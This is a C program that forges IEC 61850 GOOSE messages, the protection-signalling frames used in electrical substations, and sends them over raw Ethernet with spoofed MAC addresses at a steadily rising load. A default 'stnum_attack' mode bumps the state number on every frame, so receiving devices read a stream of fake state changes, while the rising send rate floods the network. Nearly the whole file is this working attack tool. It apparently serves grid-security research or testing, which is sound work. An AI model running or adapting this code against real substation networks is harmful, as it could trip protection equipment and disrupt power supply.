#include <endian.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <net/if.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <linux/if_packet.h>
#include <unistd.h>
#include <inttypes.h>
#include <time.h>
#include "raw_sock_goose.h"

#define BUFSIZE  1500
#define DEFAULT_IFACE "eth0"

uint8_t asciiToHex(uint8_t * hmac)
{
	for(int j = 0; j <2; j++)
	{
		uint8_t ascii = hmac[j];			
		if(ascii >= 0x30 && ascii < 0x67)
		{
			if(ascii < 0x40)
			{
				ascii &= 0x0F;
			}
			else if((ascii > 0x40 && ascii < 0x47) || (ascii > 0x60 && ascii < 0x67))
			{
				ascii = (ascii + 9) & 0x0F;
			}
			else
			{
				perror("mac second check");
			}
		}
		else
		{
			perror("mac first check");
		}
		hmac[j] = ascii;
	}
	return (uint8_t)(hmac[1] | (hmac[0] << 4));
}

void parseMac(uint8_t * mac, struct ether_header *eth, 	struct sockaddr_ll socket_address, int dest)
{
	for(int i = 0; i < 6; i++)
	{
		uint8_t hmac[2] = {0,0};
		hmac[0] = mac[i*2];
		hmac[1] = mac[(i*2)+1];
		uint8_t temp_mac = asciiToHex(hmac);
		if(dest > 0)
		{
			eth->ether_dhost[i] = temp_mac;
			socket_address.sll_addr[i] = temp_mac;
		}
		else
		{
			eth->ether_shost[i] = temp_mac;
		}
	}
}

uint64_t goose_timestamp()
{
	uint64_t timestamp;
	char total_stamp[8];
	struct timespec time_spec;
	clock_gettime(CLOCK_REALTIME, &time_spec);
	unsigned int frac = 500000000;
	unsigned int nsec = time_spec.tv_nsec;
	
	timestamp = (uint64_t)(time(NULL)) << 32;
	
	for(int i = 1; i <= 24; i++)
	{
		uint32_t mask = 1 << (32-i);
		if(time_spec.tv_nsec > frac)
		{
			timestamp |= mask;
			time_spec.tv_nsec = time_spec.tv_nsec - frac;
		}
		frac = frac / 2; 
	}
	timestamp |= 0x18;
	return timestamp;
}

int ber_encode(char tag, char * data, uint16_t length, char * buffer)
{
	int i = 0;
	*buffer++ = tag;
	i++;
	if(length >= 128)
	{
		if(length >= 256)
		{
			*buffer++ = 0x82;
			*buffer++ = (uint8_t)length >> 8;
			i += 2;
		} else
		{
			*buffer++ = 0x81;
			i++;
		}
	}
	*buffer++ = (uint8_t) length;
	i++;
	for(int j = 0; j < length; j++)
	{
		buffer[j] = data[j];
	}
	i += length;
	return i;
}

int goose_update_packet(char * send_buffer, int send_length, struct goose_indices * data_indices, uint32_t state_number)
{
	int increase = 0;
	char goose_updated_timestamp[10];
	char updated_stnum[8];
	int currStNum;
	uint64_t goose_timestamp_unencoded = goose_timestamp();
	uint64_t swapped_timestamp;
	swapped_timestamp = be64toh(goose_timestamp_unencoded);
	char * tstamp_ptr = &swapped_timestamp;
	char tstamp_ber_buffer[10];
	int ber_length = ber_encode(TIMESTAMP_TAG, tstamp_ptr, 8, tstamp_ber_buffer);

	int working_index = data_indices->timestamp_index +sizeof(struct ether_header);

	for(int i = 0; i<10; i++)
	{
		send_buffer[working_index+i] = tstamp_ber_buffer[i];
	}

	int stnum_length = data_indices->sequence_index - data_indices->state_index;
	uint32_t swap = be32toh(state_number);
	char state_number_pointer[4];
	char state_number_buffer[8];
	uint16_t length = 0;
	if(state_number < 256)
	{
		length = 1;
	}
	else if(state_number < 65536)
	{
		length = 2;
	}
	else if(state_number < 16777216)
	{
		length = 3;
	}
	else
	{
		length = 4;
	}
	for(int i = 0; i < length; i++)
	{
		state_number_pointer[length-i-1] = (swap >> (3-i)*8);
	}
	ber_length = ber_encode(STATE_TAG, state_number_pointer, length, state_number_buffer);
	if (ber_length > stnum_length)
	{
		increase = 1;
		//update length
		++send_length;
		uint16_t length_buffer = send_buffer[sizeof(struct ether_header)+2] << 8 | send_buffer[sizeof(struct ether_header)+3];
		++length_buffer;
		send_buffer[sizeof(struct ether_header)+2] = (char)length_buffer >> 8;
		send_buffer[sizeof(struct ether_header)+3] = (char)length_buffer;

		int rewrite_length = send_length - data_indices->state_index+2;
		uint8_t old,new;
		int start_point = sizeof(struct ether_header)+data_indices->sequence_index;
		new = send_buffer[start_point];
		//rewrite to buffer
		for(int i = start_point; i < send_length-1; i++)
		{
			old = send_buffer[i+1];
			send_buffer[i+1] = new;
			new = old;
		}
		//update all indexes
		data_indices->sequence_index++;
		data_indices->test_index++;
		data_indices->confrev_index++;
		data_indices->ndscom_index++;
		data_indices->numdatasetentries_index++;
		data_indices->packet_length++;
		send_buffer[sizeof(struct ether_header)+sizeof(struct goose_apdu)-1]++;
	}
	int start_point = sizeof(struct ether_header)+data_indices->state_index;
	for(int i = 0; i<ber_length; i++)
	{
		send_buffer[start_point+i] = state_number_buffer[i];
	}
	//increment pduheader

	return increase;
}
int goose_build_pduheader(char * data_buffer, char * packet_buffer, struct goose_indices * data_indices)
{
	int data_length;
	char * current_index = packet_buffer;
	uint16_t ber_length = 0;
	uint16_t pdu_length = 0;
	uint16_t idx = sizeof(struct goose_apdu);
	uint16_t * curr_idx = (uint16_t *) data_indices;
	uint16_t * next_idx = (uint16_t *) data_indices + 1;
	int idx_len;

	for(uint16_t i = GOCBREF_TAG; i <= NUMDATSETENTRIES_TAG; i++)
	{
		//we'll generate a correct timestamp
		if(i != TIMESTAMP_TAG)
		{
			//so GOID index will need to reference stnum index
			if(i == GOID_TAG)
			{
				*next_idx++;
			}
			idx_len = *next_idx - *curr_idx;
			//update the current index
			*curr_idx++ = idx + pdu_length;
			ber_length = ber_encode(i, data_buffer, idx_len, current_index);	
			current_index += ber_length;
			pdu_length += ber_length;
			data_buffer += idx_len;
			next_idx++;
		}
		else
		{
			//generate our timestamp
			uint64_t timestamp = goose_timestamp();

			uint64_t swapped_timestamp;
			swapped_timestamp = be64toh(timestamp);
			char * tstamp_ptr = &swapped_timestamp;
			*curr_idx++ = idx + pdu_length;
			ber_length = ber_encode(TIMESTAMP_TAG, tstamp_ptr, 8, current_index);
			current_index += ber_length;			
			pdu_length += ber_length;
		}
	}
	data_indices->packet_length -= 2;
	return pdu_length;
}


int goose_args(char * packet_buffer, char * data_buffer, struct goose_indices * data_indices)
{
	//static values
	int pdu_length = 0;
	int ber_length = 0;
	int pdu_length_size = 0;
	uint16_t idx_len = 0;
		
	//dynamic values	
	char * temp_buff = (char *)(malloc(BUFSIZE*sizeof(char)));
	char * current_index = temp_buff;
	struct goose_apdu * apdu = (struct goose_apdu *) packet_buffer;
	int idx = sizeof(struct goose_apdu);
	int num_entries = data_buffer[(int)(data_indices->numdatasetentries_index)];
	uint16_t * curr_idx = (uint16_t *) &data_indices;

	//data_buffer: |appid|gocbref|tat|dataset|goid|stnum|sqnum|test|confref|ndscom|#dataset|datatype,len,data|
	//Build APDU header
	apdu->appid = (uint16_t)((*data_buffer++<<8 | *(data_buffer++)));
	apdu->reserved1 = 0x0000;
	apdu->reserved2 = 0x0000;
	apdu->pdu_tag = GOOSE_PDU_TAG;
	
	//Build PDU header:
	pdu_length = goose_build_pduheader(data_buffer, current_index, data_indices);
	
	//We don't know alldata (tag 0xAB) length yet, calculate that
	int data_length = 0;
	char * numdata_buff = (char *) malloc(256);
	current_index += pdu_length;
	data_buffer += data_indices->packet_length;
	//encode our data:
	for(int i = 0; i < num_entries; i++)
	{
		char * data_loc = (data_buffer) + 2;
		char * len_loc = (data_buffer) + 1;
		ber_length = ber_encode(*data_buffer, data_loc, (uint16_t)*len_loc, numdata_buff); 
		data_buffer += ber_length;
		numdata_buff += ber_length;			
		pdu_length += ber_length;
		data_length += ber_length;
	}
	numdata_buff -= data_length;
	//Now we can finish the PDU header
	*current_index = ALLDATA_TAG;
	current_index++;
	pdu_length++;
	if(data_length >= 256)
	{		
		*current_index = 0x82;
		*current_index = (char)data_length >> 8;
		pdu_length += 2;
		current_index += 2;
	}else if(pdu_length >= 128)
	{
			*current_index = 0x81;
			current_index++;
			pdu_length++;
	}
	*current_index = data_length;
	current_index++;
	pdu_length++;
	
	//But, the data needs to be put in our correct buffer
	for(int i = 0; i < data_length; i++)
	{
		current_index[i] = numdata_buff[i];
	}
	
	//So, we can calculate total pdu length
	current_index = packet_buffer + sizeof(struct goose_apdu)-1;
	if(pdu_length >= 256)
	{		
		*current_index = 0x82;
		*current_index = (char)pdu_length >> 8;
		current_index += 2;
		pdu_length_size += 2;
	}else if(pdu_length >= 128)
	{
			*current_index = 0x81;
			pdu_length_size++;
			current_index++;
	}
	*current_index = pdu_length;
	current_index++;
	pdu_length_size++;
	
	//Reserved1&2 + pdu tag are added for apdu length
	apdu->length = pdu_length+pdu_length_size+9;

	//The APDU header is complete. All that is left is to finish packet generation
	for(int i=0; i < pdu_length; i++)
	{
		current_index[i] = temp_buff[i]; 
	}
	
	//And update packet indexes for future use
	curr_idx = (uint16_t *) &data_indices;
	for(uint16_t i = GOCBREF_TAG; i <= NUMDATSETENTRIES_TAG; i++)
	{
		*curr_idx += pdu_length_size;
		curr_idx++;
	}
	free(temp_buff);
	free(numdata_buff);
	return apdu->length;
}

int default_goose_args(char * packet_buffer, struct goose_indices * data_indices)
{
	uint16_t idx = 0;
	char * data_buffer = (char *) malloc(BUFSIZE * sizeof(char));
	char * encoding_buffer = data_buffer;
	//data_buffer: |appid|gocbref|tat|dataset|goid|stnum|sqnum|test|confref|ndscom|#dataset|datatype,len,data|
	char appid[2] = {0x03,0x00};
	strcpy(encoding_buffer, appid);
	encoding_buffer += 2;	
	idx += 2;
	
	char gocbRef[22] = "LPNSCFG/LLN0$GO$GPub01";
	data_indices->gocbref_index = idx;
	strcpy(encoding_buffer, gocbRef);
	encoding_buffer += 22;	
	idx += 22;
	
	char tat[2] = {0x07, 0xd0};
	data_indices->timeallowed_index = idx;
	memcpy(encoding_buffer, tat,2);
	encoding_buffer += 2;	
	idx += 2;
	
	char datSet[21] = "LPNSCFG/LLN0$URDSet01";
	data_indices->dataset_index = idx;
	strcpy(encoding_buffer, datSet);
	encoding_buffer += 21;	
	idx += 21;
	
	char goID[8] = "LPNS";
	data_indices->goid_index = idx;
	strcpy(encoding_buffer, goID);
	encoding_buffer += 4;	
	idx += 4;
	
	char zero = 0x00;
	data_indices->state_index = idx;
	*encoding_buffer = zero;
	encoding_buffer++;
	idx++;
	
	data_indices->sequence_index = idx;
	*encoding_buffer = 0x00;
	encoding_buffer++;
	idx++;
	
	data_indices->test_index = idx;
	*encoding_buffer = zero;
	encoding_buffer++;
	idx++;
	
	data_indices->confrev_index = idx;
	*encoding_buffer = 0x01;
	encoding_buffer++;
	idx++;
	
	data_indices->ndscom_index = idx;
	*encoding_buffer = 0x00;
	encoding_buffer++;
	idx++;

	data_indices->numdatasetentries_index = idx;
	char numDat = 0x03;
	*encoding_buffer = numDat;
	encoding_buffer++;
	
	idx++;
	data_indices->packet_length = idx;
	char data[14] = {0x83, 0x01, 0x00, 0x87,0x05, 0x80,0x00, 0x00, 0x00, 0x00, 0x84, 0x02, 0x06, 0x40};
	memcpy(encoding_buffer, data, 14);
	encoding_buffer += 14;
	
	int packet_len = goose_args(packet_buffer, data_buffer, data_indices);
	free(data_buffer);
	return packet_len;
}


int packets_per_second(int load, int packet_length)
{
	long traffic = load * 1000000;
	return traffic / (packet_length *8);
}

time_t inittimestamp()
{
	struct timespec start;
	clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &start);
	return start.tv_sec;
}

uint64_t gettimestamp(time_t start_seconds)
{
	struct timespec now;
	clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &now);
	uint64_t seconds = (uint64_t)(now.tv_sec - start_seconds);
	uint64_t timestamp = seconds*1000000000 + now.tv_nsec;
	return timestamp;
}

void main(int argc, uint8_t* argv[])
{

	int sock,iface_idx, line_size, load, pps; 
	long delay_per_packet;
	struct timespec delay;
	int send_length, packet_len, count = 0;	
	int indexes[20];
	char send_buffer[BUFSIZE];
	struct ether_header *eth = (struct ether_header *) send_buffer;
	struct sockaddr_ll socket_address;
	struct ifreq iface_mac;
	char * iface_name = (char *) malloc(IFNAMSIZ);
	struct timespec start, current;
	int elapsed, elapsed_raw;
	long nsec_spent, curr_delay;
	uint64_t runtime;
	long packets_sent;
	int on = 1;
	char DMAC[12] = {"010ccd010003"};
	char SMAC[12] = {"dca632910000"};
	unsigned int len = sizeof(on);
	FILE *params;
	struct goose_indices * data_indices = (struct goose_indices *)malloc(sizeof(struct goose_indices));
	char * goose_buffer = (char *) malloc(BUFSIZE);	
	int stnum_attack = 1;
	uint32_t state_number = 1;
	if(argc >= 2)
	{
		load = atoi(argv[1]);

	}else
	{	
		load = 50;
	}
	if(argc >= 3)
	{	runtime = atoi(argv[2]);

	}
	else
	{
		runtime = 20;
	}
	if(argc >= 4)
	{
		stnum_attack = atoi(argv[3]);
	}
	if(argc < 5)
	{
		printf("No parameters passed...using defaults");
		fflush(stdout);
		packet_len = default_goose_args(goose_buffer, data_indices);
	}
	else
	{
		params = fopen(argv[1], "r"); 
		int buffer_size = 3000;
		char * file_buffer = (char *)malloc(buffer_size * sizeof(char));

		line_size = getline(&file_buffer, &buffer_size, params);
		char * current_file = file_buffer + line_size;
		indexes[count++] = line_size;
		while(line_size >= 0)
		{
			line_size = getline(&current_file, &buffer_size, params);
			indexes[count] = line_size + indexes[count-1];
			if(indexes[count] > 2500)
				line_size = -1;
			count++;
			current_file += line_size;
		}
		current_file = file_buffer;
		//parse_goose_args(&current_file, &indexes, count);
		free(file_buffer);
	}

	if(SMAC[0] == 0x00)
	{
		for(int i = 0; i < 6; i++)
		{
			eth->ether_shost[i] = ((uint8_t *)&iface_mac.ifr_hwaddr.sa_data)[i];
		}
	}
	else{
		parseMac(SMAC, eth, socket_address, 0);
	}

	//Open Socket
 	sock = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	sock >= 0 ? : perror("Socket Creation");
	//Make non-blocking calls
	setsockopt(sock, SOL_SOCKET, SO_DONTROUTE, (void *)&on, len) >= 0? : perror("Socket Routing"); 
	//interface association
	strcpy(iface_name, DEFAULT_IFACE);

	memset(&iface_mac, 0, sizeof(struct ifreq));
	strncpy(iface_mac.ifr_name, iface_name, IFNAMSIZ-1);
		

	memset(&socket_address, 0, sizeof(struct sockaddr_ll));	
	ioctl(sock, SIOCGIFHWADDR, &iface_mac) >= 0 ? : perror("SIOCGIFHWADDR");
	ioctl(sock, SIOCGIFINDEX, &iface_mac) >= 0 ? : perror("SIOCGIFINDEX");
	
	socket_address.sll_family = AF_PACKET;
	socket_address.sll_ifindex = iface_mac.ifr_ifindex;
	memset(send_buffer, 0, BUFSIZE);
	parseMac(DMAC, eth, socket_address, 1);	
	eth->ether_type = htons(0x88B8);
	
	int eth_hdr_len = sizeof(struct ether_header);
	send_length += eth_hdr_len;


	char temp = goose_buffer[2];
	goose_buffer[2] = goose_buffer[3];
	goose_buffer[3] = temp;
	for(int g = 0; g < packet_len; g++)
	{ 
		send_buffer[eth_hdr_len+g] = goose_buffer[g];
	}
	send_length = packet_len + eth_hdr_len;
	int burst_size = 0;
	int num_bursts = 0;
	
	int start_load = load;
	while(load == start_load)
	{
		pps = packets_per_second(load, send_length);
		delay_per_packet = 1000000000 / pps;

		burst_size = pps / 100;
		num_bursts = 100;
		if(burst_size == 0)
		{
			num_bursts = 1;
			burst_size = pps;
		}

		if(load >= 80)
		{
			burst_size = pps / 500;
			num_bursts = 500;
		}else if(load >= 30)
		{
			burst_size = pps / 300;
			num_bursts = 300;
		}

		uint64_t burst_temp = burst_size;
		uint64_t delay_per_burst = burst_size * delay_per_packet;
		//clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &start);
		struct timespec remain;
		delay.tv_sec = 0;
		remain.tv_sec = 0;
		time_t start_seconds = inittimestamp();
		uint64_t first_burst_start, next_burst_start, now;
		first_burst_start = next_burst_start = gettimestamp(start_seconds);
		uint64_t max_runtime_ns = (runtime * 1000000000) + first_burst_start;
		int iterations_without_sleep = 0;
		

		while(1)
		{
			if(iterations_without_sleep)
			{
				burst_size += burst_size;
			}
			for(int i = 0; i < burst_size; i++)
			{
				if(stnum_attack)
				{
					++state_number;
					int increase = goose_update_packet(send_buffer, send_length, data_indices, state_number);
					if(increase)
					{
						++send_length;
					}
				}
				sendto(sock, send_buffer, send_length, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll));// >= 0 ? : perror("sending"); 
			}
			burst_size = burst_temp;
			next_burst_start += delay_per_burst;
			now = gettimestamp(start_seconds);
			if(now > max_runtime_ns)
			{
				break;
			}
			if(next_burst_start > now)
			{
				iterations_without_sleep = 0;
				while(now < next_burst_start)
				{
					for(int sleep = 0; sleep < 200; sleep++)
					{
						asm("nop");
					}
					now = gettimestamp(start_seconds);
				}
			}
			else
			{
				next_burst_start += delay_per_burst;
				iterations_without_sleep=1;
			}
		}
		if(load >= 10)
		{
			load += 10;
		}
		else
		{
		load += 1;
		}
	}
	close(sock);
	free(iface_name);
	free(data_indices);
	free(goose_buffer);
}
